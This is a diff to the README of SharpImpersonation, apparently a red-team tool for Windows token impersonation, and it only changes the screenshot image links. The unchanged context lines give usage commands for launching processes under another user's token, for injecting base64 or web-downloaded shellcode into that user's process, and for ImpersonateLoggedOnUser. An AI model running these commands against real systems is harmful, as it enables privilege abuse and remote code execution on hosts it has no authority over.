@@ -24,22 +24,22 @@ A blog post for the intruduction can be found here:
 
 `SharpImpersonation.exe user:<user> binary:<binary-Path>`
 
-![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/CreateProcessWithTokenW.PNG)
+![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/CreateProcessWithTokenW.PNG?raw=true)
 
 ======================  Inject base64 encoded shellcode into the first process of <user>  ======================
 
 `SharpImpersonation.exe user:<user> shellcode:<base64shellcode>`
 
-![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ShellcodeBase64.PNG)
+![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeBase64.PNG?raw=true)
 
 ======================  Inject shellcode loaded from a webserver into the first process of <user>  ======================
 
 `SharpImpersonation.exe user:<user> shellcode:<URL>`
 
-![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ShellcodeWebDownload.PNG)
+![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ShellcodeWebDownload.PNG?raw=true)
 
 ======================  Impersonate user <user> via ImpersonateLoggedOnuser for the current session  ======================
 
 `SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser`
 
-![alt text](https://raw.githubusercontent.com/S3cur3Th1sSh1t/SharpImpersonation/main/Images/ImpersonateLoggedOnUser.png)
+![alt text](https://github.com/S3cur3Th1sSh1t/SharpImpersonation/blob/main/Images/ImpersonateLoggedOnUser.PNG?raw=true)
